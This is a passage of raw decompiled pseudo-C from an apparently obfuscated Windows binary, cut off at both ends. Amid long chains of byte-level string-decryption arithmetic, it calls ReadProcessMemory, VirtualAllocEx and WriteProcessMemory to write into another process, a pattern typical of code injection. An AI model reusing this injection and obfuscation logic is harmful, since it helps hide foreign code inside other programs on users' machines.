        uVar11 = uVar13;
      }
      if (uVar7 < uVar11 + 0x7a) {
        cVar10 = bVar2 + (bVar5 + 0x15 & bVar2) * -2 + -0x7e;
LAB_14001211c:
        bVar15 = cVar10 + bVar5;
LAB_14001211f:
        if (uVar11 + uVar7 != 0x80) {
          if (uVar11 + 3 < uVar7) {
            cVar10 = bVar2 + (bVar5 + 1 & bVar2) * -2 + -6;
LAB_1400120d7:
            bVar15 = cVar10 + bVar5;
LAB_1400120da:
            if (999 < uVar7) {
              cVar10 = bVar2 * '\x02' + (bVar5 + 0x88 & bVar2) * -2 + -0x30;
              goto LAB_1400125e6;
            }
            if (uVar11 + 5 < uVar7) {
              cVar10 = bVar2 + (bVar5 + 0xba & bVar2) * -2 + -0x5c;
LAB_14001209b:
              bVar15 = cVar10 + bVar5;
            }
            else {
              if (uVar7 == uVar11 + 1) {
                bVar15 = bVar5 + bVar2 + (bVar5 - 0x1c & bVar2) * -2 + 0xa8;
                uVar17 = uVar17 + *(byte *)((longlong)&local_298 + uVar17) + uVar11 + 1;
                goto LAB_140011c93;
              }
              if (uVar7 == uVar11 + 2) {
                bVar15 = bVar2 + (bVar5 + 0xe & bVar2) * -2 + -0x54 + bVar5;
                goto LAB_140012506;
              }
              if (uVar7 == uVar11 + 3) {
                bVar15 = bVar2 + (bVar5 + 0x38 & bVar2) * -2 + -0x50 + bVar5;
                goto LAB_1400124de;
              }
              if (uVar7 == uVar11 + 8) {
                cVar10 = bVar2 + (bVar5 + 0x34 & bVar2) * -2 + -0x38;
                goto LAB_1400125a4;
              }
            }
            if (uVar11 < 0x1000) {
LAB_14001207b:
              *(byte *)((longlong)&local_298 + uVar17) = bVar15;
              uVar17 = uVar17 + 1;
              goto LAB_140011c93;
            }
            bVar15 = (bVar2 + (bVar5 + 0x5e & bVar2) * -2 + bVar5) * '\x02' + 0x98;
          }
          else {
            if (uVar7 != uVar11 + 1) {
              if (uVar7 == uVar11 + 2) {
                bVar15 = ('\x01' - (bVar5 + 0x55 & bVar2)) * '\x02' + bVar2 + bVar5;
                uVar11 = uVar11 + 1;
              }
              else {
                if (uVar7 == uVar11 + 3) {
                  cVar10 = ('\x05' - (bVar5 + 0xa9 & bVar2)) * '\x02' + bVar2;
                  goto LAB_1400125e6;
                }
                if (uVar7 == uVar11 + 7) {
                  bVar15 = ('\v' - (bVar5 + 0x27 & bVar2)) * '\x02' + bVar2 + bVar5;
                  goto LAB_1400124de;
                }
                if (uVar7 != uVar11 + 8) goto LAB_1400120da;
                bVar15 = ('\x0f' - (bVar5 + 0x7b & bVar2)) * '\x02' + bVar2 + bVar5;
                uVar17 = uVar17 + *(byte *)((longlong)&local_298 + uVar17) + uVar11 + 1;
              }
              goto LAB_140011c93;
            }
            cVar10 = bVar2 + (bVar5 + 0x2b & bVar2) * -2 + -2;
LAB_1400125a4:
            bVar15 = cVar10 + bVar5;
          }
          *(byte *)((longlong)&local_298 + uVar17) =
               bVar2 + (bVar2 & bVar5 + 0x73) * -2 + -0x25 + bVar5 + 0x73;
          uVar11 = uVar11 + 1;
          goto LAB_140011c93;
        }
        bVar15 = (bVar5 + (bVar5 + 0xb2 & bVar2) * -2) - 0x2c;
LAB_1400124de:
        bVar5 = bVar2 + (bVar2 & bVar5 - 0x39) * -2 + -0x71 + (bVar5 - 0x39);
        *(byte *)((longlong)&local_298 + uVar17) = bVar5;
        uVar17 = uVar17 - ((ulonglong)bVar5 + uVar11 + 1);
        uVar11 = uVar11 + 1;
      }
      else {
        if (uVar7 == uVar11 + 1) {
          bVar15 = ('*' - (bVar5 + 0x72 & bVar2)) * '\x02' + bVar2 + bVar5;
          uVar17 = uVar17 + *(byte *)((longlong)&local_298 + uVar17) + uVar11 + 1;
          goto LAB_140011c93;
        }
        if (uVar7 != uVar11 + 2) {
          if (uVar7 == uVar11 + 3) {
            bVar15 = ('.' - (bVar5 - 0x3a & bVar2)) * '\x02' + bVar2 + bVar5;
            goto LAB_1400124de;
          }
          if (uVar7 == uVar11 + 5) {
            cVar10 = ('4' - (bVar5 + 0x44 & bVar2)) * '\x02' + bVar2;
LAB_1400125e6:
            bVar15 = cVar10 + bVar6;
            *(byte *)((longlong)&local_298 + uVar17) =
                 bVar2 + (bVar2 & bVar5 + 0x9d) * -2 + -0x4b + bVar15 + bVar5 + 0x9d;
LAB_140012607:
            uVar7 = uVar7 + uVar11;
LAB_14001260a:
            uVar17 = uVar17 - bVar15;
          }
          else {
            if (uVar7 != uVar11 + 4) {
              if (uVar7 != uVar11 + 2) goto LAB_14001211f;
              cVar10 = (':' - (bVar5 - 0x3e & bVar2)) * '\x02' + bVar2;
              goto LAB_1400125a4;
            }
            bVar15 = ('6' - (bVar5 + 0x6e & bVar2)) * '\x02' + bVar2 + bVar5;
          }
          goto LAB_140011c93;
        }
        bVar15 = (',' - (bVar5 + 0x9c & bVar2)) * '\x02' + bVar2 + bVar5;
      }
LAB_140012506:
      bVar5 = (char)uVar17 - 0x24;
      *(byte *)((longlong)&local_298 + uVar17) = bVar5 + (bVar5 & bVar2) * -2 + -4 + bVar2;
      uVar7 = uVar7 + 1;
      lVar18 = uVar17 + (-1 - uVar7);
      uVar17 = lVar18 + (&bStack_299)[lVar18 + 1] + uVar11 + 1;
      goto LAB_140011c93;
    }
    iVar4 = local_298;
LAB_140012690:
    if (uVar14 < (ulonglong)(longlong)iVar4) {
      local_f0 = 0;
      ReadProcessMemory(hProcess,(LPCVOID)(uVar14 + lVar12),&local_f0,8,(SIZE_T *)0x0);
      local_e8 = local_f0;
      WriteProcessMemory(hProcess,(LPVOID)(uVar14 + (longlong)lpAddress),&local_e8,8,(SIZE_T *)0x0);
      uVar14 = uVar14 + 8;
      goto LAB_140011c68;
    }
    local_278 = 0xd3d0d1da;
    local_274 = 0;
    local_26c = 0;
    local_268 = 0;
    bVar15 = local_120[0];
LAB_140012720:
    uVar14 = DAT_140a618c8;
    uVar7 = DAT_140a618d0;
LAB_140012730:
    uVar11 = 0;
    uVar13 = uVar7;
LAB_140012733:
    if (uVar11 < 0x11) {
      bVar2 = local_1f8[uVar11 - 0x80];
LAB_140012743:
      if (uVar14 <= uVar11) {
        cVar10 = (char)uVar11;
        if (uVar14 < uVar13 + 1) goto code_r0x000140012755;
        if (uVar14 == uVar13 + 1) {
          bVar15 = bVar2 + (cVar10 - 0x17U) + (cVar10 - 0x17U & bVar2) * -2 + 0xa1;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x80] + uVar13 + 1;
        }
        else {
          if (uVar14 == uVar13 + 3) {
            bVar15 = (bVar2 + cVar10 + 0x75U + (cVar10 + 0x75U & bVar2) * -2) - 0x33;
            goto LAB_140013146;
          }
          if (uVar14 == uVar13 + 5) {
            bVar15 = bVar2 + cVar10 + 0x47U + (cVar10 + 0x47U & bVar2) * -2 + 0xf;
LAB_1400130f8:
            local_1f8[uVar11 - 0x80] =
                 (cVar10 - 0x25U) + (cVar10 - 0x25U & bVar2) * -2 + '\x03' + bVar15 + bVar2;
LAB_140013114:
            uVar14 = uVar14 + uVar13;
            goto LAB_140013117;
          }
          if (uVar14 == uVar13 + 2) {
            bVar15 = cVar10 - 0x2d;
            cVar16 = '\a';
LAB_1400130c5:
            bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
            uVar13 = uVar13 + 1;
          }
          else {
            if (uVar14 != uVar13 + 9) goto LAB_1400127b0;
            bVar15 = cVar10 + 0x19;
            cVar16 = '5';
LAB_140013086:
            cVar16 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10;
LAB_140013092:
            bVar15 = cVar16 + bVar2;
LAB_140013095:
            local_1f8[uVar11 - 0x80] =
                 cVar10 + 0x95U + (cVar10 + 0x95U & bVar2) * -2 + -0x13 + bVar2;
            uVar13 = uVar13 + 1;
          }
        }
        goto LAB_140012733;
      }
    }
    else {
      in_stack_00f588af = local_278;
    }
LAB_140013217:
    local_258 = 0x3334c536;
    local_254 = 0;
    uStack_24c = 0;
    local_244 = 0;
    bVar15 = local_120[0];
LAB_140013240:
    uVar14 = DAT_140a618c8;
    uVar7 = DAT_140a618d0;
LAB_140013250:
    uVar11 = 0;
    uVar13 = uVar7;
LAB_140013252:
    if (uVar11 < 0x18) {
      bVar2 = local_1f8[uVar11 - 0x60];
LAB_140013262:
      if (uVar14 <= uVar11) {
        cVar10 = (char)uVar11;
        if (uVar13 + 1 <= uVar14) {
          if (uVar14 == uVar13 + 1) {
            bVar15 = cVar10 + 0xbU + bVar2 + (bVar2 & cVar10 + 0xbU) * -2 + 0xb3;
            uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x60] + uVar13 + 1;
          }
          else if (uVar14 == uVar13 + 2) {
            bVar15 = bVar2 + (bVar2 & cVar10 + 0xbdU) * -2 + -0x2b + cVar10 + 0xbdU;
LAB_140013beb:
            bVar5 = (char)uVar11 + 0x8c;
            local_1f8[uVar11 - 0x60] = ('\x16' - (bVar2 & bVar5)) * '\x02' + bVar2 + bVar5;
            uVar14 = uVar14 + 1;
            lVar18 = uVar11 + (-1 - uVar14);
            uVar11 = lVar18 + (byte)local_1f8[lVar18 + -0x60] + uVar13 + 1;
          }
          else {
            if (uVar14 == uVar13 + 2) {
              bVar15 = (cVar10 - 0x2dU) + bVar2 + (bVar2 & cVar10 - 0x2dU) * -2 + 0x3b;
            }
            else {
              if (uVar14 != uVar13 + 3) {
                if (uVar14 != uVar13 + 5) goto LAB_1400132d0;
                bVar15 = cVar10 + bVar2 + (cVar10 - 0x17U & bVar2) * -2 + 0x8a;
                uVar13 = uVar13 + 1;
                goto LAB_140013252;
              }
              bVar15 = bVar2 + (bVar2 & cVar10 + 0x85U) * -2 + ']' + cVar10 + 0x85U;
LAB_140013b81:
              local_1f8[uVar11 - 0x60] =
                   bVar2 + (bVar2 & cVar10 + 0x81U) * -2 + 'y' + bVar15 + cVar10 + 0x81U;
            }
LAB_140013bb6:
            uVar14 = uVar14 + uVar13;
LAB_140013bb9:
            uVar11 = uVar11 - bVar15;
          }
          goto LAB_140013252;
        }
        bVar15 = cVar10 + 0x59U + (cVar10 + 0x59U & bVar2) * -2 + -0x6f + bVar2;
LAB_1400132d0:
        if (uVar11 < uVar13) {
          in_stack_011b2dcd = in_stack_0159e974;
          goto LAB_140013c98;
        }
        if (uVar13 + 0x20 <= uVar14) {
          if (uVar14 == uVar13 + 1) {
            bVar15 = cVar10 - 1;
            cVar16 = '\x03';
            goto LAB_140013b10;
          }
          if (uVar14 != uVar13 + 2) {
            if (uVar14 != uVar13 + 3) {
              if (uVar14 != uVar13 + 4) {
                if (uVar14 != uVar13 + 6) goto LAB_140013340;
                bVar15 = cVar10 + bVar2 + (cVar10 + 0x8fU & bVar2) * -2 + 0xa6;
                uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x60] + uVar13 + 1;
                goto LAB_140013252;
              }
              bVar15 = ('+' - (cVar10 - 0x39U & bVar2)) * '\x02' + bVar2 + cVar10;
              goto LAB_140013bb6;
            }
            bVar15 = bVar2 + (cVar10 + 0x15U & bVar2) * -2 + -0x7e + cVar10;
            goto LAB_140013b81;
          }
          bVar15 = cVar10 + bVar2 + (cVar10 + 99U & bVar2) * -2 + 0xae;
          goto LAB_140013252;
        }
        bVar15 = ('\x19' - (cVar10 + 0x4dU & bVar2)) * '\x02' + bVar2 + cVar10;
LAB_140013340:
        while (uVar7 = uVar13, uVar11 < uVar13 + uVar14) {
          while( true ) {
            do {
              uVar13 = uVar7;
              if (uVar14 == uVar13 + 0x41) {
                cVar16 = bVar2 + (cVar10 + 0x3eU & bVar2) * -2 + -0x74;
                goto LAB_140013b1c;
              }
              if (uVar14 == uVar13 + 0x42) {
                bVar15 = ('0' - (cVar10 - 0x10U & bVar2)) * '\x02' + bVar2 + cVar10;
                uVar13 = uVar13 + 1;
                goto LAB_140013252;
              }
              if (uVar14 == uVar13 + 5) {
                bVar15 = ('\x1a' - (cVar10 + 0xa2U & bVar2)) * '\x02' + bVar2 + cVar10;
                goto LAB_140013252;
              }
              if (uVar14 == uVar13 + 0x61) {
                bVar15 = ('\x04' - (cVar10 + 0x54U & bVar2)) * '\x02' + bVar2 + cVar10;
                goto LAB_140013b81;
              }
              if (uVar14 == uVar13 + 0x28) {
                bVar15 = (cVar10 + bVar2 + (cVar10 + 6U & bVar2) * -2) - 0x24;
                goto LAB_140013bb6;
              }
              if (uVar14 == uVar13 + 3) {
                bVar15 = cVar10 + bVar2 + (cVar10 + 0xb8U & bVar2) * -2 + 0xb0;
                goto LAB_140013bb9;
              }
              if (uVar14 == uVar13 + 0x400) {
                bVar15 = bVar2 + (cVar10 + 0x6aU & bVar2) * -2 + -0x7c + cVar10;
                goto LAB_140013a62;
              }
              if (uVar14 == uVar13 + 0x10) {
                bVar15 = (',' - (cVar10 + 0x1cU & bVar2)) * '\x02' + bVar2 + cVar10;
                goto LAB_140013beb;
              }
              if (uVar14 == uVar13 + 1) {
                bVar15 = ('\x16' - (cVar10 - 0x32U & bVar2)) * '\x02' + bVar2 + cVar10;
                uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x60] + uVar13 + 1;
                goto LAB_140013252;
              }
              uVar7 = uVar13;
            } while (uVar14 == uVar13 + 0x200);
            uVar14 = uVar13 + 0x2a;
            uVar7 = uVar13 + 0x33;
            if (uVar14 < uVar13 + 0xb3) {
              bVar15 = bVar2 + cVar10 + (cVar10 + 0x8bU & bVar2) * -2 + 0xbe;
              goto LAB_140013240;
            }
            if (uVar14 < uVar13 + 0x3b) {
              bVar15 = bVar2 + cVar10 + (cVar10 + 0x3dU & bVar2) * -2 + 0x92;
              goto LAB_140013250;
            }
            if (uVar14 < uVar13 + 0x74) {
              bVar15 = ('3' - (cVar10 - 0x11U & bVar2)) * '\x02' + bVar2 + cVar10;
              uVar13 = uVar7;
              goto LAB_140013262;
            }
            if (uVar14 < uVar13 + 0x75) {
              bVar15 = ('\x1d' - (cVar10 + 0xa1U & bVar2)) * '\x02' + bVar2 + cVar10;
              uVar13 = uVar7;
              goto LAB_1400132d0;
            }
            if (uVar14 < uVar13 + 0x38) break;
            if (uVar14 < uVar13 + 0x94) {
              cVar16 = bVar2 + (cVar10 + 5U & bVar2) * -2 + -0x1e;
              uVar13 = uVar7;
              goto LAB_140013715;
            }
            if (uVar14 < uVar13 + 0x5b) {
              cVar16 = bVar2 + (cVar10 + 0xb7U & bVar2) * -2 + -0x4a;
              uVar13 = uVar7;
              goto LAB_1400136d0;
            }
            if (uVar14 < uVar13 + 0x36) {
              cVar16 = bVar2 + (cVar10 + 0x69U & bVar2) * -2 + -0x76;
              uVar13 = uVar7;
              goto LAB_140013696;
            }
            if (uVar14 < uVar13 + 0x433) {
              bVar15 = ('/' - (cVar10 + 0x1bU & bVar2)) * '\x02' + bVar2 + cVar10;
              uVar13 = uVar7;
              goto LAB_140013676;
            }
            if (uVar13 + 0x43 <= uVar14) {
              uVar14 = uVar13 + 0x41b;
              uVar7 = uVar13 + 0x41c;
              if (uVar13 + 0x426 < uVar14) {
                bVar15 = (cVar10 + bVar2 + (cVar10 - 0x28U & bVar2) * -2) - 0x10;
                uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x60] + uVar7 + 1;
                uVar13 = uVar7;
                goto LAB_140013252;
              }
              if (uVar13 + 0x446 < uVar14) {
                bVar15 = bVar2 + (cVar10 + 0x8aU & bVar2) * -2 + -0x3c + cVar10;
                uVar13 = uVar7;
                goto LAB_140013beb;
              }
              if (uVar13 + 0x49c < uVar14) {
                bVar15 = bVar2 + (cVar10 + 0x3cU & bVar2) * -2 + -0x68 + cVar10;
                uVar13 = uVar7;
                goto LAB_140013a62;
              }
              if (uVar13 + 0x424 < uVar14) {
                bVar15 = ('6' - (cVar10 - 0x12U & bVar2)) * '\x02' + bVar2 + cVar10;
                uVar13 = uVar7;
                goto LAB_140013bb9;
              }
              if (uVar13 + 0x45d < uVar14) {
                bVar15 = (' ' - (cVar10 + 0xa0U & bVar2)) * '\x02' + bVar2 + cVar10;
                uVar13 = uVar7;
                goto LAB_140013bb6;
              }
              if (uVar13 + 0x45e < uVar14) {
                bVar15 = ('\n' - (cVar10 + 0x52U & bVar2)) * '\x02' + bVar2 + cVar10;
                uVar13 = uVar7;
                goto LAB_140013b81;
              }
              if (uVar13 + 0x421 < uVar14) {
                bVar15 = (cVar10 + bVar2 + (cVar10 + 4U & bVar2) * -2) - 0x18;
                uVar13 = uVar7;
                goto LAB_140013252;
              }
              if (uVar13 + 0x47d < uVar14) {
                bVar15 = cVar10 + bVar2 + (cVar10 + 0xb6U & bVar2) * -2 + 0xbc;
                uVar13 = uVar13 + 0x41d;
                goto LAB_140013252;
              }
              if (uVar13 + 0x444 < uVar14) {
                cVar16 = bVar2 + (cVar10 + 0x68U & bVar2) * -2 + -0x70;
                uVar13 = uVar7;
                goto LAB_140013b1c;
              }
              if (uVar14 <= uVar13 + 0x41f) {
                uVar14 = uVar13 + 0x43c;
                uVar7 = uVar13 + 0x83c;
              }
            }
          }
          bVar15 = ('\a' - (cVar10 + 0x53U & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar13 = uVar7;
        }
        if (uVar14 < uVar13 + 0x61) {
          cVar16 = bVar2 + (cVar10 + 0x59U & bVar2) * -2 + -0x16;
LAB_140013715:
          bVar15 = cVar16 + cVar10;
LAB_140013718:
          if (uVar13 + uVar14 == 0x41) {
            bVar15 = (cVar10 + (cVar10 - 0x26U & bVar2) * -2) - 0x1c;
LAB_140013a62:
            bVar5 = bVar2 + (bVar2 & cVar10 + 0x33U) * -2 + -0x65 + cVar10 + 0x33U;
            local_1f8[uVar11 - 0x60] = bVar5;
            uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
            uVar13 = uVar13 + 1;
            goto LAB_140013beb;
          }
          if (uVar14 <= uVar13 + 6) {
            if (uVar14 == uVar13 + 1) {
              cVar16 = bVar2 + (cVar10 - 0x19U & bVar2) * -2 + -0x6a;
              goto LAB_140013b1c;
            }
            if (uVar14 != uVar13 + 2) {
              if (uVar14 == uVar13 + 3) {
                bVar15 = (cVar10 + bVar2 + (cVar10 + 0xafU & bVar2) * -2) - 0x1a;
                goto LAB_140013bb6;
              }
              if (uVar14 == uVar13 + 7) {
                bVar15 = bVar2 + (cVar10 + 0x13U & bVar2) * -2 + -0x72 + cVar10;
                goto LAB_140013a62;
              }
              goto LAB_1400136d3;
            }
            bVar15 = ('\x1f' - (cVar10 + 0x4bU & bVar2)) * '\x02' + bVar2 + cVar10;
            goto LAB_140013252;
          }
          cVar16 = bVar2 + (cVar10 + 0x35U & bVar2) * -2 + -0x3e;
LAB_1400136d0:
          bVar15 = cVar16 + cVar10;
LAB_1400136d3:
          if (0x7f < uVar14) {
            bVar15 = ('\b' - (cVar10 + 0x28U & bVar2)) * '\x02' + bVar2 * '\x02' + cVar10;
            goto LAB_140013b81;
          }
          if (uVar13 + 0x5a < uVar14) {
            cVar16 = bVar2 + (cVar10 + 0x82U & bVar2) * -2 + -0xc;
LAB_140013696:
            bVar15 = cVar16 + cVar10;
          }
          else {
            if (uVar14 == uVar13 + 1) {
              bVar15 = (cVar10 + bVar2 + (cVar10 + 0x34U & bVar2) * -2) - 0x38;
              uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x60] + uVar13 + 1;
              goto LAB_140013252;
            }
            if (uVar14 == uVar13 + 3) {
              bVar15 = ('8' - (cVar10 + 0x98U & bVar2)) * '\x02' + bVar2 + cVar10;
              goto LAB_140013a62;
            }
            if (uVar14 == uVar13 + 5) {
              bVar15 = ('\f' - (cVar10 - 4U & bVar2)) * '\x02' + bVar2 + cVar10;
              goto LAB_140013bb6;
            }
            if (uVar14 == uVar13 + 2) {
              bVar15 = cVar10 - 0x3c;
              cVar16 = '4';
              goto LAB_140013b10;
            }
          }
          if (uVar13 < 10) {
LAB_140013676:
            local_1f8[uVar11 - 0x60] = bVar15;
            uVar11 = uVar11 + 1;
            goto LAB_140013252;
          }
          bVar15 = (('\x1e' - (cVar10 + 0x76U & bVar2)) * '\x02' + bVar2 + cVar10) * '\x02';
        }
        else {
          if (uVar14 == uVar13 + 1) {
            bVar15 = ('2' - (cVar10 + 0x9aU & bVar2)) * '\x02' + bVar2 + cVar10;
            uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x60] + uVar13 + 1;
            goto LAB_140013252;
          }
          if (uVar14 == uVar13 + 3) {
            bVar15 = ('\x06' - (cVar10 - 2U & bVar2)) * '\x02' + bVar2 + cVar10;
            goto LAB_140013a62;
          }
          if (uVar14 == uVar13 + 5) {
            bVar15 = bVar2 + (cVar10 + 0x14U & bVar2) * -2 + -0x78 + cVar10;
            goto LAB_140013b81;
          }
          if (uVar14 != uVar13 + 9) goto LAB_140013718;
          bVar15 = cVar10 + 0x2a;
          cVar16 = '\x02';
LAB_140013b10:
          cVar16 = (cVar16 - (bVar15 & bVar2)) * '\x02' + bVar2;
LAB_140013b1c:
          bVar15 = cVar16 + cVar10;
        }
        local_1f8[uVar11 - 0x60] = bVar2 + (bVar2 & cVar10 - 0x31U) * -2 + 'W' + (cVar10 - 0x31U);
        uVar13 = uVar13 + 1;
        goto LAB_140013252;
      }
    }
    else {
      in_stack_011b2dcd = local_258;
    }
LAB_140013c98:
    lpBaseAddress_00 =
         VirtualAllocEx(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),(LPVOID)0x0,0x18,
                        in_stack_011b2dcd,in_stack_00f588af);
    local_128 = 0;
    local_138 = uVar9;
    local_130 = param_2;
    WriteProcessMemory(*(HANDLE *)(*(longlong *)(local_148[0] + 0x58) + 0x30),lpBaseAddress_00,
                       &local_138,0x110,(SIZE_T *)0x0);
    local_c8 = (LPCVOID)0x0;
    lStack_c0 = 0;
    local_b8 = 0;
    FUN_1400392c0(&local_c8,FUN_14000fc30);
    local_238 = 0xf3f28d8c;
    uStack_234 = 0xf7f6f1f1;
    local_230 = 0;
    local_228 = 0;
    bVar15 = local_120[0];
LAB_140013d60:
    uVar7 = DAT_140a618c8;
    uVar14 = DAT_140a618d0;
LAB_140013d70:
    uVar11 = 0;
    uVar13 = uVar14;
LAB_140013d73:
    if (uVar11 < 0x14) {
      bVar2 = local_1f8[uVar11 - 0x40];
LAB_140013d83:
      if (uVar7 <= uVar11) {
        cVar10 = (char)uVar11;
        if (uVar7 < uVar13 + 1) goto code_r0x000140013d95;
        if (uVar7 == uVar13 + 1) {
          bVar15 = (cVar10 + 0xbaU + bVar2 + (bVar2 & cVar10 + 0xbaU) * -2) - 0x16;
          uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x40] + uVar13 + 1;
        }
        else {
          if (uVar7 == uVar13 + 2) {
            bVar15 = ('\x11' - (bVar2 & cVar10 + 0xb2U)) * '\x02' + bVar2 + cVar10 + 0xb2U;
LAB_140014713:
            bVar5 = bVar2 + (bVar2 & cVar10 - 0x16U) * -2 + -0x66 + (cVar10 - 0x16U);
            local_1f8[uVar11 - 0x40] = bVar5;
            uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
            uVar13 = uVar13 + 1;
            goto LAB_14001473b;
          }
          if (uVar7 != uVar13 + 2) {
            if (uVar7 != uVar13 + 3) {
              if (uVar7 != uVar13 + 4) goto LAB_140013df0;
              bVar15 = cVar10 + 0x9a;
              cVar16 = '2';
              goto LAB_140014650;
            }
            bVar15 = bVar2 + (bVar2 & cVar10 + 0x26U) * -2 + -10 + cVar10 + 0x26U;
            goto LAB_1400146a4;
          }
          bVar15 = cVar10 + 0x2eU + bVar2 + (bVar2 & cVar10 + 0x2eU) * -2 + 0xbe;
LAB_1400146df:
          uVar11 = uVar11 - bVar15;
        }
        goto LAB_140013d73;
      }
    }
    else {
      in_stack_008449ae = CONCAT44(uStack_234,local_238);
    }
LAB_1400147ed:
    FUN_1400393b0(&local_c8,in_stack_008449ae,lpBaseAddress_00);
    local_218 = 0xeee6faef;
    local_214 = 0xf3aafeee;
    local_210 = 0xedea;
    local_20e = 0x58;
    local_20d = 0;
    local_205 = 0;
    local_203 = 0;
    bVar15 = local_120[0];
LAB_140014840:
    uVar14 = DAT_140a618c8;
    uVar7 = DAT_140a618d0;
LAB_140014850:
    uVar11 = 0;
    uVar13 = uVar7;
LAB_140014852:
    if (uVar11 < 0x16) {
      bVar2 = local_1f8[uVar11 - 0x20];
      cVar10 = (char)uVar11;
LAB_140014866:
      if (uVar11 < uVar14) {
        puVar8 = (undefined4 *)(auStackY_338 + 0xc81d17);
        goto LAB_140015270;
      }
      if (uVar14 < uVar13 + 1) goto code_r0x000140014878;
      if (uVar14 == uVar13 + 1) {
        bVar15 = bVar2 + cVar10 + 0x19U + (cVar10 + 0x19U & bVar2) * -2 + 0x51;
        uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x20] + uVar13 + 1;
      }
      else {
        if (uVar14 == uVar13 + 3) {
          bVar15 = bVar2 + (cVar10 - 0x1bU) + (cVar10 - 0x1bU & bVar2) * -2 + 0xbd;
LAB_140015199:
          bVar5 = (cVar10 - 0x2fU) + (cVar10 - 0x2fU & bVar2) * -2 + 'I' + bVar2;
          local_1f8[uVar11 - 0x20] = bVar5;
          uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
          uVar13 = uVar13 + 1;
          goto LAB_1400151bc;
        }
        if (uVar14 == uVar13 + 5) {
          bVar15 = bVar2 + cVar10 + 0x17U + (cVar10 + 0x17U & bVar2) * -2 + 0x5f;
          goto LAB_14001514b;
        }
        if (uVar14 == uVar13 + 2) {
          bVar15 = cVar10 + (cVar10 - 0x1dU & bVar2) * -2 + -0x52 + bVar2;
          uVar13 = uVar13 + 1;
        }
        else {
          if (uVar14 != uVar13 + 6) goto LAB_1400148d2;
          bVar15 = ('%' - (cVar10 + 0x49U & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_1400150ed:
          local_1f8[uVar11 - 0x20] = cVar10 + 5U + (cVar10 + 5U & bVar2) * -2 + -0x23 + bVar2;
          uVar13 = uVar13 + 1;
        }
      }
      goto LAB_140014852;
    }
    puVar8 = &local_218;
LAB_140015270:
    FUN_140023550(local_1f8,puVar8);
    FUN_14000fa30(local_148[0],local_78,local_1f8,0);
    FUN_140025000(local_1f8);
    local_1d8 = 0xaba4a566;
    local_1d4 = 0;
    local_1cc = 0;
    local_1c8 = 0;
LAB_1400152d0:
    uVar14 = DAT_140a618c8;
    uVar7 = DAT_140a618d0;
LAB_1400152e0:
    uVar11 = 0;
    uVar13 = uVar7;
    bVar15 = local_120[0];
LAB_1400152e2:
    if (uVar11 < 0x12) {
      bVar2 = local_1f8[uVar11 + 0x20];
      cVar10 = (char)uVar11;
LAB_1400152f6:
      if (uVar14 <= uVar11) {
        if (uVar13 + 1 <= uVar14) {
          if (uVar14 == uVar13 + 1) {
            bVar15 = (cVar10 - 0x31U) + bVar2 + (bVar2 & cVar10 - 0x31U) * -2 + 0x57;
            uVar11 = uVar11 + (byte)local_1f8[uVar11 + 0x20] + uVar13 + 1;
          }
          else {
            if (uVar14 == uVar13 + 2) {
              bVar15 = bVar2 + (bVar2 & cVar10 - 0x1dU) * -2 + -0x35 + (cVar10 - 0x1dU);
              goto LAB_140015c8c;
            }
            if (uVar14 != uVar13 + 3) {
              if (uVar14 != uVar13 + 6) {
                if (uVar14 != uVar13 + 2) goto LAB_140015360;
                cVar16 = ('#' - (cVar10 + 0x1fU & bVar2)) * '\x02' + cVar10;
                goto LAB_140015bde;
              }
              bVar15 = bVar2 + (bVar2 & cVar10 + 0x81U) * -2 + 'y' + cVar10 + 0x81U;
              goto LAB_140015c22;
            }
            bVar15 = cVar10 + 0x6dU + bVar2 + (bVar2 & cVar10 + 0x6dU) * -2 + 5;
LAB_140015c5a:
            uVar11 = uVar11 - bVar15;
          }
          goto LAB_1400152e2;
        }
        bVar15 = cVar10 + 0x45U + (cVar10 + 0x45U & bVar2) * -2 + '\x1d' + bVar2;
LAB_140015360:
        if (uVar11 < uVar13) {
          in_stack_017cc1c9 = in_stack_015c3884;
          goto LAB_140015d62;
        }
        if (uVar14 < uVar13 + 0x61) {
          bVar15 = ('\x05' - (cVar10 + 0xa9U & bVar2)) * '\x02' + cVar10 + bVar2;
        }
        else {
          if (uVar14 == uVar13 + 1) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0x33U & bVar2) * -2) - 0x32;
            goto LAB_140015be1;
          }
          if (uVar14 == uVar13 + 3) {
            bVar15 = ('+' - (cVar10 + 0x47U & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_1400152e2;
          }
          if (uVar14 == uVar13 + 2) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0x5bU & bVar2) * -2) - 0x22;
            uVar14 = uVar14 + uVar13;
            goto LAB_140015c5a;
          }
          if (uVar14 == uVar13 + 5) {
            bVar15 = bVar2 + cVar10 + (cVar10 - 0x1bU & bVar2) * -2 + 0xa2;
            goto LAB_140015c5a;
          }
          if (uVar14 == uVar13 + 6) {
            bVar15 = ('3' - (cVar10 + 0x6fU & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_140015c8c;
          }
        }
        while (uVar7 = uVar13, uVar11 < uVar14 + uVar13) {
          while( true ) {
            do {
              uVar13 = uVar7;
              if (uVar14 == uVar13 + 100) {
                cVar16 = ('\x0e' - (cVar10 + 0xa6U & bVar2)) * '\x02' + cVar10;
                goto LAB_140015bde;
              }
              if (uVar14 == uVar13 + 2) {
                bVar15 = (bVar2 + cVar10 + (cVar10 + 0x30U & bVar2) * -2) - 0x20;
                uVar13 = uVar13 + 1;
                goto LAB_1400152e2;
              }
              if (uVar14 == uVar13 + 0x42) {
